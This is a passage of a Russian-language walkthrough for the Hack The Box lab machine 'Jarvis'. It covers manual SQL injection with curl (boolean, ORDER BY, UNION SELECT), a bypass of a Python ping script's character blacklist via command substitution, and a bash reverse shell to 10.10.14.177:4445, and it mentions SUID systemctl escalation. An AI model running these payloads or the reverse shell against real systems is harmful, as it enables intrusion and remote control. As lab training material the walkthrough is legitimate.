2. SQL Injection (manual)

Главная страница /rooms-suites.php содержит ссылки вида /room.php?cod=N.

Проверяем boolean-based:
curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=2" | wc -c
# 5916 → разница → SQLi подтверждён

Определяем количество колонок через ORDER BY:
for i in 1 5 7 8 9; do
  size=$(curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 ORDER BY $i" | wc -c)
  echo "ORDER BY $i → $size bytes"
done
# ORDER BY 7 → 6204
# ORDER BY 8 → 5916 → 7 колонок

UNION SELECT для проверки версии и текущего пользователя:
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('START',version(),'END'),3,4,5,6,7-- -" \
  | grep -oE "START.*END"
# START10.1.48-MariaDB-0+deb9u2END

Ключевая уязвимость:
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()

Фильтр не блокирует $, (, ). Используем command substitution.

Создаём /tmp/shell.sh (важно — двойные кавычки внутри bash -c, потому что os.system вызывает sh → dash, а dash не понимает >&):
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"' > /tmp/shell.sh
chmod +x /tmp/shell.sh
cat /tmp/shell.sh
# bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"

Key Takeaways:
- SQLi: manual UNION-based extraction без sqlmap.
- INTO OUTFILE не перезаписывает существующий файл → используем новое имя при каждой попытке.
- os.system() вызывает sh (dash) → >& не работает; обёртка bash -c "..." с двойными кавычками.
- Фильтр simpler.py пропускает $(), что даёт command injection.
- SUID systemctl → GTFOBins через link + start произвольного unit.
